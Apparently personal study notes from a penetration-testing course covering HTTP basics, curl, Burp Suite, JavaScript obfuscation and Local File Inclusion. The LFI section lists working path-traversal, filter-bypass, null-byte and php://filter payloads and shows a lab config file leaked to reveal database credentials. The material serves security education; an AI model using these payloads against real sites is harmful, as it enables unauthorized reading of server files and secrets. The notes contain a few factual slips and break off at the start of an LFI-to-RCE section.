# Notes on Website-based penetration testing techniques
***

## OWASP Top Ten

1. **Broken Access Control**: refers to the restrictions of abilities and functionalities a user is vested at a particular level of authentication.
2. **Cryptographic Failures**: Weak cryptographic protections around sensitive data can lead to leaks.
3. **Injection**: Carefully crafted input can be used to execute code on vulnerable web servers.
  - Cross-Site Scripting (XSS) is a particular form of injection where the code that gets inputted by an attacker is executed within the browser of another user.
4. **Insecure Design**: refers to issues that occurs because the design of the application is fundamentally flawed, such as an application that doesn't check password length when entered.
5. **Security Misconfiguration**: refers to any security settings or configurations that are poorly managed, such as forgetting to change default credentials.
6. **Vulnerable and Outdated Components**: vulnerabilities introduced by not keeping components the website relies on updated.
7. **Identification and Authentication Failures**: refers to mechanisms such as allowing users to authenticate with weak credentials and making it possible to impersonate users by stealing session information.
8. **Software and Data Integrity Flaws**: refers to issues related to code storage, data storage, insecure repositories, or delivery systems that can be exploited to gain unauthorized access to or control over critical server components.
9. **Security Logging and Monitoring Failures**: not logging or monitoring website activities can keep defenders from detecting an intrusion for a long time.
10. **Server-Side Request Forgery (SSRF)**: happens when a web application tries to reach a remote server without validating the URL of the remote server. If an attacker can control the contents of the URL, this can allow them to force the application to make a request to a resource it shouldn't be able to reach, including an attacker's own server.
***

## HyperText Transfer Protocol (HTTP)

The term **hypertext** stands for text containing links to other resources and text that can be easily interpreted by the readers.
- HTTP communication consists of a client and a server.
- Default port is 80.
- **Uniform Resource Locator (URL)** example: http://admin:password@inlanefreight.com:80/dashboard.php?login=true#status
  - **Scheme**: `http://`
  - **User**: `admin:password`
  - **Host**: `inlanefreight.com`
  - **Port**: `80`
  - **Path**: `/dashboard.php`
  - **Query String**: `?login=true`
  - **Fragment**: `#status`

| Component | Description |
| --------- | ----------- |
| Scheme | This is used to identify the protocol being accessed by the client. This is usually **http** or **https**. |
| User Info | This is an optional component that contains credentials in the form **username:password**, which is used to authenticate to the host. |
| Host | The host signifies the resource location. This can be a hostname or an IP address. A colon separates a host and port. |
| Port | URLs without a port specified point to the default port 80. If the HTTP server port isn't running on port 80, it can be specified in the URL. |
| Path | This points to the resource being accessed, which can be a file or a folder. If there is no path specified, the server returns the default index document hosted by it (for example, index.html).
| Query String | The query string is preceded by a question mark (?). This is another optional component that is used to pass information to the resource. A query string consists of a parameter and a value. In the example above, the parameter is **login**, and its **value** is true. There can be multiple parameters separated by an ampersand (&). |
| Fragments | This is processed by browsers on the client-side to locate sections within the primary resource. |

- Not all components are always required to access a resource. However, a URL should at least contain a scheme and host to make a proper request.

**Anatomy of an HTTP Request**:
1. User enters URL into browser.
2. DNS server is queried for the IP address associated with the URL.
3. The browser sends a GET request to the server on port 80, asking for the root `/` folder.
4. By default, the server will respond with an `index.html` file  with the status code `200 OK`.
5. The `index.html` file is rendered by the web browser and presented to the user.

- **HTML (HyperText Markup Language)**: a client-side language that is understood and processed by browsers. It is the standard markup language to display documents via a web browser.
- **CSS (Cascading Style Sheets)**: assist HTML pages in applying presentation elements such as layout, colors, and fonts to one or multiple web pages as well as scripting languages such as **JavaScript** which enable interactive web pages.
- **Markup Language**: a system for annotating a document in a way that is visually distinguishable from the content.
***

## Hypertext Transfer Protocol Secure (HTTPS)

When this protocol is enabled, all communication between the client and the webserver are encrypted. Sites that utilize HTTPS can be identified through `https://` in the URL.
- The default port for HTTPS is 443.

**Anatomy of an HTTPS Request**:
1. User browses to http://inlanefreight.com
2. DNS server is queried for the IP address associated with the URL.
3. The server redirects the request to port 443 after receiving the request on port 80.
  - This is done via the `301 Moved Permanently` response code.
4. Next, the client sends a "client hello" packet, giving information about itself.
5. The server replies with "server hello", followed by a **key exchange**.
6. The client verifies this key and sends one of its own.
7. An encrypted handshake is initiated to verify if the encryption and transfer are working properly.
8. Once the handshake completes successfully, normal HTTP communication is continued, which is encrypted thereafter.
***

## HTTP Cookies

HTTP cookies are a common way to maintain state throughout a series of HTTP requests for a particular user. Most web applications use cookies as part of their authentication framework.
- Browsers use *tokens* as a means to store username and password information in order to send with future requests after the information has been initially collected. The server validates the credentials and creates a session identified by a random token. This token is returned to the user in the HTTP response to the login request. The browser will save this cookie and include it on all subsequent requests to the site.

When the user navigates to a new page and the browser sends the HTTP request, the server will read the cookie value and look up the session. Using, this information, the server knows which user sent the request.
***

## Headers

HTTP Headers provide an additional way to pass information between a client and server. They can have one or multiple values appended after the header name and separated by a colon.
- **General Headers**: Used to describe the message rather than its contents.
  - **Date**: holds the date and time at which the message originated.
  - **Connection**: dictates if the current network connection should stay alive after the requests finishes. Usually contain either `close` or `keep-alive`.
  - **Example**:
    ```
    <SNIP>
    Date: Sun, 06 Aug 2020 08:49:37 GMT
    Connection: keep-alive
    ```
- **Entity Headers**: Used to describe the content (entity) being transferred by a message. Usually found in responses and POST or PUT requests.
  - **Content-Type**: This header is used to describe the type of resource being transferred. The value is automatically added by the browsers on the client-side and returned in the server response.
  - **Media-Type**: The `media-type` describes the data being passed. For example, the media-type for a PDF is `application/pdf`, while the type for a PNG image is `image/png`. This header can play a crucial role in making the server interpret our input. The `charset` field denotes the encoding standard, such as UTF-8.
  - **Boundary**: The `boundary` directive acts as a maker to separate content when there is more than one in the same message.
  - **Content-Length**: The `Content-Length` header holds the size of the entity being passed. This header is necessary as the server uses it to read data from the message body.
  - **Content-Encoding**: Data can undergo multiple transformations before being passed. For example, large-amounts of data can be compressed to reduce the message size. The type of encoding being used should be specified using the `Content-Encoding` header.
  - **Example**:
    ```
    <SNIP>
    Content-Length: 26012
    Content-Type: text/html; charset=ISO-8859-4
    Content-Encoding: gzip
    ```
- **Request Headers**: Used in an HTTP request and do not relate to the content of the message. Headers such as `Accept`, `Accept-*`, and `IF-*` allow for conditional requests. Headers such as `Cookie` or `User-Agent` are sent so that the server can tailer the response.
  - **Host**: The `Host` header is used to specify the host being queried for the resource. This can be a domain name or an IP address. HTTP servers can be configured to host different websites, which are revealed based on the hostname. This makes the host header an important enumeration target.
  - **Origin**: Tells the server where a request originally comes from.
  - **User-Agent**: The `User-Agent` header is used to describe the client requesting resources. For example, a browser or a library. This header can reveal a lot about the client, such as the browser, its version, and the operating system.
  - **Accept**: The `Accept` header describes which media types the client can understand. It can contain multiple media types separated by commas. The `*/*` value signifies all media types.
  - **Accept-Language**: Tells the server which human-speaking language the client expects back.
  - **Accept-Encoding**: Tells the server which encoding types the client will understand. In particular, this allows the client and server to negotiate which compression algorithm should be used to transmit data.
  - **Forwarded**: Provides the server with diagnostics for a given request that comes via a proxy. By default, it gathers sensitive client-side information.
  - **Cookie**: The `Cookie` header should contain cookie-value pairs in the formate `name=value`. HTTP is a stateless protocol, meaning the server has no way to identify clients connecting to it. This is a problem when hosting protected resources and content. A **cookie** is a piece of data stored on the client and server, which acts as an identifier. These are passed to the server per request, thus maintaining the client's access. Cookies can also serve other purposes, such as saving user preferences or session tracking. There can be multiple cookies in a single header separated by a semi-colon.
  - **Referer**: The `Referer` header denotes where the current requests is coming from. For example, clicking a link from Google search results would make https://google.com the referer. Trusting this header can be dangerous as it can be easily manipulated, leading to unintended consequences.
  - **Authorization**: The `Authorization` HTTP header is another way for the server to identify clients. After successful authentication, the server returns a token unique to the client. Unlike cookies, tokens are stored only on the client-side and retrieved by the server per request. There are multiple types of authentication types based on the webserver and application type used.
  - **Example**:
    ```
    Host: www.inlanefreight.com
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko)
    Cookie: cookie1=298zf09hf012fh2; cookie2=u32t4o3tb3gg4
    Accept: text/plain
    Referer: https://www.hackthebox.eu/
    Authorization: BASIC cGFzc3dvcmQK
    <SNIP>
    ```
- **Response Headers**: Used in an HTTP response and don't relate to the message's content. Certain response headers such as `Age`, `Location`, and `Server` are used to provide more context about the response.
  - **Server**: The `Server` header contains information about the HTTP server, which handled the request. It can be used to gain information about the server, such as its version, and enumerate it further.
  - **Set-Cookie**: The `Set-Cookie` header contains the cookies needed for client identification. Browsers parse the cookies and store them for future requests. This header follows the same format as the `Cookie` header.
  - **Proxy-Authenticate**: Tells the client which type of authentication should be used to access a page resource sitting behind a proxy.
  - **Proxy-Authorization**: Tells the client which credentials to use in order to access a page or resource sitting behind a proxy. Credentials are transmitted in base64 encoding.
  - **Strict-Transport-Security (HSTS)**: Tells a client that is should only access the server via HTTPS.
  - **X-Headers**: Some headers start with the letter X, such as *X-Requested-With*. This syntax is one way to represent non-standard HTTP headers.
    - For Example, the *X-Requested-With* header usually suggests Ajax requests, and the *X-amz-cf-id* header indicates that the application uses Amazon CloudFront.
  - **WWW-Authenticate**: The `WWW-Authenticate` header notifies the client about the type of authentication required to access the requested resource.
  - **Example**:
    ```
    <SNIP>
    Server: Apache/2.2.14 (Win32)
    Set-Cookie: name1=value1,name2=value2; Expires=Wed, 09 Jun 2021 10:18:14 GMT
    WWW-Authenticate: BASIC realm="localhost"
    ```
- **Security Headers**: A class of response headers used to specify certain rules and policies to be followed by the browser while accessing the website.
  - **Content-Security-Policy**: The CSP header dictates the website's policy towards externally injected resources. This could be JavaScript code as well as script resources. This header instructs the browser to accept resources only from certain trusted domains, hence preventing access such as Cross-site scripting.
  - **Strict-Transport-Security**: The HTTP Strict Transport Security policy of a website prevents the browser from accessing the website over the plaintext HTTP protocol. All communication is done via the secure HTTPS protocol. This prevents attackers from sniffing web traffic and accessing protected information such as passwords or other sensitive data.
  - **Referrer-Policy**: This header dictates whether the browser should include the value specified via the `Referer` header or not. It can help in avoiding disclosing sensitive URLs and information while browsing the website.
  - **Example**:
    ```
    <SNIP>
    Content-Security-Policy: script-src 'self'
    Strict-Transport-Security: max-age=31536000
    Referrer-Policy: origin
    ```
***

## HTTP Methods and Codes

An HTTP request method tells the HTTP protocol what kind of action the client wants to perform on a given resource or page. It's then up to the server to determine how to interpret or handle the request.

| Method | Description |
| ------ | ----------- |
| GET | Requests a specific resource. Additional data can be passed to the server via query strings. |
| POST | Can handle multiple types of input, such as PDFs and text. This data is appended in the request body present after the headers. The POST method is commonly used when sending information (forms, logins) or uploading data to a website, such as images or documents. |
| HEAD | Requests the headers that would be returned if a GET request was made to the server. |
| PUT | Used to create new resources on the server. |
| DELETE | Lets users delete existing resources on a webserver. |
| OPTIONS | Returns information about the server, such as the methods accepted by it. |

- Response codes are used by HTTP to tell the client whether the request was sucessfully processed.

| Type | Description |
| ---- | ----------- |
| 1xx | Usually provides information and continues processing the request. |
| 2xx | Positive response codes returned when a request succeeds. |
| 3xx | Returned when the server redirects the client. |
| 4xx | This class of codes signifies improper request from the client. For example, requesting a resource that doesn't exist or requesting a bad format. |
| 5xx | Returned when there is some problem with the HTTP server itself. |

***

## HTTP GET Method

Used to request a given resource and retrieve it.
- The header in the server's response will contain the type of *Authorization* required.
  - **Basic**: Credentials are sent via cleartext
  - **Digest**: Used MD5 to encrypt credentials.
  - **Bearer**: used to send tokens, which identify the client. Defined and created by applications and commonly associated with the **OAuth** authorization framework.
- Multiple parameter value pairs can be included when separated by an "&".

Usually when we click a link or visit a URL, the browser sends a GET request to receive the HTML for that page.

### HTTP GET Method Key Terms:

- **Method**: The "GET" that the HTTP request starts with.
- **Path**: The path to the requested resource on the webserver.
- **Query String**: After the path is the query string, which is delimited by a question mark (?). This provides the parameters for the request.
- **Parameters**: Variables that can be used to take a specific action, like dynamically changing the content or logging in as a specific user.
- **Protocol**: Defines the version of HTTP being used. For example: `HTTP/1.1`
- **Headers**: Allow the client and server to pass variables back and forth. They're separated by a colon `:` where the name of the header is on the left and the value is on the right. Examples include: `Host`, `Connection`, and `User-Agent`.
- **Body**: Refers to a location that a payload may be found. The body is the last line/lines of an HTTP request.

### HTTP GET Parameters and URL Encoding

Encoding is the tranformation of data from one form into another.

**URL Encoding**: Web browsers interpret text within a URL in one of two ways: either as raw text, or as special characters that perform a particular function within the URL. These special characters include:
- `?`: The query string identifier, which starts a query string. Example: `http://site.com?search`
- `=`: Separates a parameter and value pair. Example: `language=english`
- `&`: Appends another parameter and value pair. Example: `language=english&color=blue`
- `/`: Indicates hierarchical directory structure or http route. Example: `http://site.com/folder/page.txt`
- `.`: Part of a directory structure. A single period (`.`) represents the current directory and two of them (`..`) represents one parent up.
- `:`: Separates the protocol and port from the resource. Example: `http://site.com`
- `%`: Indicates a URL encoding character.

URL Encoding works by replacing all forbidden URL characters with the `%` sign followed by the hexadecimal ASCII value of the specified character. For example, `URL%20encoding` specifies a space is between URL and encoding with the `%20` character.

URL Encoding can be done in Python3 using the `urllib.parse` package and the included `quote()` function.
- Use the `urllib.parse.quote('Input', safe='')` configuration to ensure all characters are encoded.

Burp Suite has an Encoder tab for URL encoding.

***

## HTTP Responses

Once the request is sent and processed by the server, the server will respond with a HTTP response. The HTTP response contains various headers that give miscellaneous information.
- For example, the `Server` header may list the operating system of the web server and the software being used, such as `Nginx` and its version.
***

## HTTP POST Method

The HTTP POST method places user parameters in an HTTP Request body.
- It can accept binary data.

Example Headers:
- **Content-Type**: Tells a server what kind of data to expect.

Contains the payload inside the body of the request.
***

## HTTP PUT, OPTIONS, HEAD, and DELETE Methods

These methods are usually allowed on Web Distributed Authoring and Versioning (WebDAV) servers. WebDAV is an extension of HTTP and is used for remote management of files and folders. It's popular in Content Management Systems (CMS) and blogging applications to enable authors to edit and upload data.

- **PUT**: Updates the content of a given resource with the client's input.
- **DELETE**: Removes the requested resource.
- **OPTIONS**: Returns the communication options allowed by the server, including the allowed methods that the server accepts.
- **HEAD**: Similar to GET, but only retrieves the HTTP headers of the page without the response body.

```
PUT /hello.txt HTTP/1.1
Host: inlanefreight.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 12

Hello World!
```

```
DELETE /hello.txt HTTP/1.1
Host: inlanefreight.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
***

## CURL

CURL (client URL) is a command-line tool and library which primarily supports HTTP along with many other protocols.
- **Default HTTP Requests**: `curl http://inlanefreight.com/`
- **Increased verbosity of Raw Output**: `curl http://inlanefreight.com/ -v`
- **Pass Authorization Credentials**: `curl -u admin:password http://inlanefreight.com/`
- **Follow Re-directions**: `curl -L http://inlanefreight.com/`
- **Pass data for a POST method**: `curl -d 'username=admin&password=password' -L http://inlanefreight.com/login.php`
  - Use `-v` with `-d` to follow the entire chain when passing data.
- **Specify cookie usage**: `curl -d 'username=admin&password=password' -L --cookie-jar /dev/null http://inlanefreight.com/login.php -v`
  - Specifying a filename will save cookies to the file.
  - `curl -d 'username=admin&password=password' -L --cookie-jar cookies.txt http://inlanefreight.com/login.php`
  - Use this file with the `--cookie` command to access the page directly.
  - `curl --cookie cookies.txt http://inlanefreight.com/admin/dashboard.php -v`
- **Specify Content-Type Header**: `curl -H 'Content-Type: application/json' -d '{ "username": "admin", "password" : "password" }' --cookie-jar /dev/null -L http://inlanefreight.com/login.php`
- **Specify a request method**: `curl -X OPTIONS http://inlanefreight.com/ -vv`
  - `curl -X PUT -d @test.txt http://inlanefreight.com/test.txt -vv`
  - `curl -X DELETE http://inlanefreight.com/test.txt -vv`
- `curl -s http://10.129.7.209:/nibbleblog/content/private/users.xml | xmllint --format -`
  - Obtain an XML file and make it easier to read.
***

## Browser Development Tools

One of the most important and common tools used for web application development and security is the browser's suite of built-in Development Tools. Often called "DevTools" for short, these browser-based interfaces are designed for development and debugging, but also to allow an end-user to inspect and manipulate client-side code.

For Firefox, click on *Settings* -> *Web Developer* -> *Toggle Tools*. Or use `Ctrl`+`Shift`+`I`.
- The **Inspector** tab displays a page's HTML dynamically.
- The **Console** tab allows the execution of JavaScript via a browser-based interpreter and view logs for the current page.
- The **Debugger** tab allows the review of all loaded JavaScript code and add breakpoints to stop execution before code is executed.
- The **Network** tab shows all the resources being requested by the current page along with the corresponding methods and the size and type of each resource.
  - It has a **Cookie** sub-tab to view any stored cookies.
- The **Style Editor** tab displays CSS on a page.
- The **Storage** tab displays various types of data that can store information about the page, including cookies.

### HyperText Markup Language (HTML)

HTML describes web resources. It lays out the structure of a page and determines what content will appear. *Markup* Languages are those that describe how to render text.

HTML uses the concept of *elements* to describe content.
- A *tag* is a keyword wrapped in angle brackets (`<>`).
- An opening tag, it's corresponding closing tag, and the content between it is called an *element*.

For most pages, right-clicking on a page and selecting `View Source` will display the HTML code for the rendered page.

**Important Tags**:
- `<html>`: Defines the beginning and end of an HTML document.
- `<head>`: Contains metadata about the document, for example the page's title.
- `<header>`: Defines the beginning and end of an introductory section of the page. Usually contains a summary or abstract.
- `<body>`: Defines the beginning and end of most of the page's content.
- `<a>`: Defines an *anchor*. The most common use for `<a>` is to flag a *hyperlink*.
- `<p>`: Defines the start of a paragraph.
- `<style>`: Inputs JavaScript directly inside HTML code.
- `<img>`: Defines an image.
- `<form>`: Defines a form where the user can input information. These are often implemented via POST requests.
- `<input>`: Defines a field where a user can input data.  

### Cascading Style Sheets (CSS)

CSS describes how the content of a web page should appear. They can be stored in three ways: *external*, *internal*, and *inline*.
- External CSS lives in its own document, which typically has the `.css` file extension. This is most often done when a developer wants to control the styling of an entire website.
- Internal CSS is used within a given HTML page, and usually takes care of styling one specific page. This is implemented with the `<style>` tag.
- Inline CSS is used to modify a specific HTML element. This is implemented with the `style=` element.
  - For example: `<p style=color:red;>Words</p>`.
***

## Burp Suite

Burp Suite is a proxy server that can be used to examine and modify HTTP requests. It also allows repeating specific requests without needing to reload a page.

An HTTP proxy is an application that sits between a client and server. For security purposes, it can allow the "pausing" of a request before it is sent to a server so that it can be viewed and modified before being sent.

Burp Suite's default proxy port is `127.0.0.1:8080`. This can be used to re-direct web traffic to via browser apps like foxyproxy or firewall rules such as `iptables`.

If the *Intercept is on* button is clicked, all requests will have to be reviewed before they are sent to a server.
- You can clear out stacked up requests that you don't intend to review by toggling *Intercept is on*.

Clicking *Open Browser* will open a new Chromium window that will show the interception of an HTTP request.

Requests can be passed onto a server by clicking *Forward* (or *Drop* to drop the HTTP request).

### Burp Suite Tabs

- **Intercept**: shows the current HTTP interception.
- **HTTP History**: shows all the HTTP requests and responses that have been proxied by Burp Suite.
***

## Javascript Deobfuscation

For most webpages, HTML is used to determine the website's main fields and parameters, CSS is used to determine its design, and JavaScript is used to perform any functions necessary to run the website.
- For Firefox, press `Ctrl + U` to open the source code viewer for a webpage.
- CSS code is either defined internally within the same HTML file between `<style>` elements, or defined externally in a separate `.css` file and referenced within the HTML code in a `<link rel="stylesheet" href="style.css">` tag.
- JavaScript can be written between `<script>` elements in an HTML file or written into a separate `.js` file and referenced with a `<script src="secret.js"></script>`.
- You can see the files referenced by clicking them in the reference links.

**Obfuscation**: A technique used to make a script more difficult to read by humans but allows it to function the same from a technical point of view, though performance may be slower.
- For example, code obfuscators often turn the code into a dictionary of all of the words and symbols used within the code and then attempt to rebuild the original code during execution by referring to each word and symbol from the dictionary.

- Test JavaScript code at: https://jsconsole.com
- Sample JavaScript: `console.log('HTP JavaScript Deobfuscation Module')`
- Code Obfuscator: http://beautifytools.com/javascript-obfuscator.php
- Advanced Code Obfuscator: https://obfuscator.io
- JavaScript Beautifier: https://prettier.io/playground/
  - Or: https://beautifier.io/
- JavaScript Deobfuscator: http://www.jsnice.org/

**Code Obfuscation Techniques**:
- **Base64**: usually used to reduce the use of special characters. Only contains alpha-numeric characters and ends with a =.
  - `echo https://www.hackthebox.eu/ | base64`
  - `echo N2gxNV8xNV9hX3MzY3IzN19tMzU1NGcz= | base64 -d`
- **Hex**: encodes each character into its hex order in the ASCII table.
  - `echo https://www.hackthebox.eu/ | xxd -p`
  - `echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r`
- **Caesar/Rot13**: shifts each letter by a fixed number. Rot13 shifts each character 13 times forward.
  - http://www would be `uggc://jjj`.
  - `echo https://www.hackthebox.eu/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
  - `echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
- Decoding tool: https://www.boxentriq.com/code-breaking/cipher-identifier

'use strict';

function apiKeys() {
    var flag = "HTB{n" + "3v3r_" + "run_0" + "bfu5c" + "473d_" + "c0d3!" + "}";
    var xhr = new XMLHttpRequest;
    var url = "/keys" + ".php";
    xhr["open"]("POST", url, !![]);
    xhr["send"](null);
}
apiKeys();
***

## File Inclusion Notes


File Inclusion is a common web application vulnerability. Server-side languages such as PHP or JSP can dynamically include external scripts. If this is not implemented properly, attackers can include both local and remote files.
***

## Local File Inclusion (LFI)

The most common place to find Local File Inclusion (LFI) Vulnerabilities is within templating engines.
- Typically include parameters such as: `/index.php?page=about`.
- Can be denied by setting `allow_url_include` to 0 in PHP.
- Under the hood, `index.php` will probably pull `header.php`, `about.php`, and `footer.php`.
- If you see `?lang=en`, then the website will grab files from the `/en/` directory.

File inclusion vulnerabilities can often be found in GET request parameters. Server-side scripts include certain files based on the user's choice or input, for example, file downloads, choice of language, or website navigation.
- For Example, in PHP when it comes to language, the code can look like: `include($_GET['language']);`.
  - You could change it to something like: `http://134.209.184.216:32391/basic/index.php?language=/etc/passwd` or `http://134.209.184.216:32391/basic/index.php?language=C:\Windows\boot.ini`

Sometimes, developers specify absolute paths when including files.
- For Example: `include("./languages/" . $_GET['language']);`
  - This statement includes the files present in the languages folder.
- `http://134.209.184.216:32391/traversal/index.php?language=/etc/passwd`
  - This would result in an error with the above string being passed to the `include()` function. This can be bypassed using a few `../` before the filename.
  - `http://134.209.184.216:32391/traversal/index.php?language=../../../../../../../../../etc/passwd`
- Another Example: `include("lang_" . $_GET['language']);`
  - `http://134.209.184.216:32569/traversal/index_2.php?language=../../../../../etc/passwd`
    - This will cause an error. To get around this include a `/` before the first `..`.
    - `http://134.209.184.216:32569/traversal/index_2.php?language=/../../../../../etc/passwd`

Scripts can employ search and replace techniques to avoid path traversals.
- For example: `$language = str_replace('../', '', $_GET['language']);`
  - This will result in `../../../../../../../../../etc/passwd` becoming `./languages/etc/passwd`.
- To get around this security measure, use the following:
  - `http://134.209.184.216:32391/blacklist/index.php?language=....//....//....//....//....//....//....//....//etc/passwd`
- To defend against this, a developer could re-write the function:
  ```
  $lfi = "....././/..../..//filename";
  while( substr_count($lfi, '../', 0)) {
    $lfi = str_replace('../', '', $lfi);
  };
  ```

On PHP versions 5.3.4 and earlier, string-based detection could be bypassed by URL encoding the payload. The characters `../` can be URL encoded into `%2e%2e%2f`, which will bypass the filter.
- `....//` can be URL encoded into `%2e%2e%2e%2e%2f%2f`.
- The payload `%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd` will bypass the re-written function above.

Scripts can manually append a `.php` or any other required extension before including the file, which serves as mitigation against the inclusion of arbitrary files.
- `include($_GET['language'] . ".php");`
- In this situation, the only option is to include PHP files and find sensitive information or vulnerabilities in the source code. Such files can be found by performing a brute force against the webserver for files with a `.php` extension, using tools such as `gobuster`, `dirbuster`, or `dirsearch`. Direct inclusion of these PHP files won't return anything, as the server will execute it as code.
- PHP provides various wrappers, which can be used for easier access to files, protocols, or streams.
  - The `php://` wrapper is enabled by default and interacts with IO streams.
  - For example: `php://stdin` and `php://stdout` can be used to access input and output streams for the process, while `php://input` and `php://output` are used to access request data.
  - The `php://filter` wrapper can be chained with multiple filters to achieve the desired output.
  - For example: `php://filter/read=/resource=/etc/passwd` reads the resource `/etc/passwd` and outputs the contents. The `read` filter can process the input with various string operations, such as base64 encoding, ROT13 encoding, etc.
- The following filters will convert the contents of `/etc/passwd` to base64 and ROT13, respectively:
  - `php://filter/read=convert.base64-encode/resource=/etc/passwd`
  - `php://filter/read=string.rot13/resource=/etc/passwd`
- `http://134.209.184.216:32391/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config`
  - The `.php` extension is added automatically by the server. The original contents can be obtained by base64 decoding the output. The entire base64 encoded contents can be obtained by either sending the request in web proxy, such as Burp Suite, or using `cURL`.

**Source Code Disclosure via PHP Wrappers**:
```
par@htb[/htb]$ curl http://134.209.184.216:32391/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Inlane Freight</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,700" rel="stylesheet">
  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css'><link rel="stylesheet" href="./style.css">
</head>

<body>
<div class="navbar">
  <a href="#home">Inlane Freight</a>
  <div class="dropdown">
    <button class="dropbtn">Language
      <i class="fa fa-caret-down"></i>
    </button>
    <div class="dropdown-content">
      <a href="index.php?language=en">English</a>
      <a href="index.php?language=es">Spanish</a>
    </div>
  </div>
</div>
<!-- partial:index.partial.html -->
<div class="blog-card">
    <div class="meta">
      <div class="photo" style="background-image: url(./image.jpg)"></div>
      <ul class="details">
        <li class="author"><a href="#">John Doe</a></li>
        <li class="date">Aug. 24, 2019</li>
      </ul>
    </div>
    <div class="description">
      <h1>History</h1>
      <h2>Containers</h2>
      PD9waHAKCiRjb25maWc9YXJyYXkoCidEQl9IT1NUJz0+J2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAonREJfVVNFUk5BTUUnPT4ncm9vdCcsCidEQl9QQVNTV09SRCc9PidEQl9BZG1pbl9QQHNzdzByZCEnLAonREJfREFUQUJBU0UnPT4nYmxvZ2RiJwopOwoKJEFQSV9LRVkgPSAiQXdldzI0MkdEc2hyZjQ2KzM1L2siOwoKLyoKJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkY29uZmlnWydEQl9IT1NUJ10sICRjb25maWdbJ0RCX1VTRVJOQU1FJ10sICRjb25maWdbJ0RCX1BBU1NXT1JEJ10sICRjb25maWdbJ0RCX0RBVEFCQVNFJ10pOwoKaWYgKG15c3FsaV9jb25uZWN0X2Vycm5vKCRjb25uKSkKICB7CgogIAllY2hvICJGYWlsZWQgY29ubmVjdGluZy4gIiAuIG15c3FsaV9jb25uZWN0X2Vycm9yKCkgLiAiPGJyLz4iOwoKICB9CiovCgo/Pgo=<br />
<b>Notice</b>:  Undefined variable: p2 in <b>/var/www/html/extension/index.php</b> on line <b>48</b><br />
      <p class="read-more">
        <a href="#">Read More</a>
      </p>
    </div>
  </div>
  <div class="blog-card alt">
    <div class="meta">
      <div class="photo" style="background-image: url(./image.jpg)"></div>
      <ul class="details">
        <li class="author"><a href="#">Jane Doe</a></li>
        <li class="date">July. 15, 2019</li>
      </ul>
    </div>
    <div class="description">
      <h1>Container Industry</h1>
      <h2>Opening a door to the future</h2>
      <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad eum dolorum architecto obcaecati enim dicta praesentium, quam nobis! Neque ad aliquam facilis numquam. Veritatis, sit.</p>
      <p class="read-more">
        <a href="#">Read More</a>
      </p>
    </div>
  </div>
<!-- partial -->
</body>
</html>
```

```
Spar@htb[/htb]$ echo 'PD9waHAKCiRjb25maWc9YXJyYXkoCidEQl9IT1NUJz0+J2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAonREJfVVNFUk5BTUUnPT4ncm9vdCcsCidEQl9QQVNTV09SRCc9PidEQl9BZG1pbl9QQHNzdzByZCEnLAonREJfREFUQUJBU0UnPT4nYmxvZ2RiJwopOwoKJEFQSV9LRVkgPSAiQXdldzI0MkdEc2hyZjQ2KzM1L2siOwoKLyoKJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkY29uZmlnWydEQl9IT1NUJ10sICRjb25maWdbJ0RCX1VTRVJOQU1FJ10sICRjb25maWdbJ0RCX1BBU1NXT1JEJ10sICRjb25maWdbJ0RCX0RBVEFCQVNFJ10pOwoKaWYgKG15c3FsaV9jb25uZWN0X2Vycm5vKCRjb25uKSkKICB7CgogIAllY2hvICJGYWlsZWQgY29ubmVjdGluZy4gIiAuIG15c3FsaV9jb25uZWN0X2Vycm9yKCkgLiAiPGJyLz4iOwoKICB9CiovCgo/Pgo=' | base64 -d

<?php

$config=array(
'DB_HOST'=>'db.inlanefreight.local',
'DB_USERNAME'=>'root',
'DB_PASSWORD'=>'DB_Admin_P@ssw0rd!',
'DB_DATABASE'=>'blogdb'
);

$API_KEY = "Awew242GDshrf46+35/k";

/*
$conn = mysqli_connect($config['DB_HOST'], $config['DB_USERNAME'], $config['DB_PASSWORD'], $config['DB_DATABASE']);

if (mysqli_connect_errno($conn))
  {

  	echo "Failed connecting. " . mysqli_connect_error() . "<br/>";

  }
*/

?>
```

- Database credentials and an API key were obtained.

PHP versions before 5.5 are vulnerable to null byte injection, meaning that adding a null byte at the end of the filename should bypass the extension check.
- For example: `language=/etc/passwd%00` will result in the statement `include("/etc/passwd%00.php")`, where the server ignores everything after the null byte.
- This occurs because C and C++ consider strings to be terminated by null bytes, while PHP doesn't.
- The URL encoded null byte (`%00`) at the end of the filename gets `.php` appended to it but is truncated to `/etc/passwd\x00` by the APIs written in C. This results in the inclusion of `/etc/passwd` instead of `/etc/passwd.php` when the `include()` function is called.
***

## LFI to Remote Code Execution (RCE)

LFI can lead to RCE under some conditions, resulting in a complete server compromise. One common way is to poison log files, which are modified based on requests to the webserver.

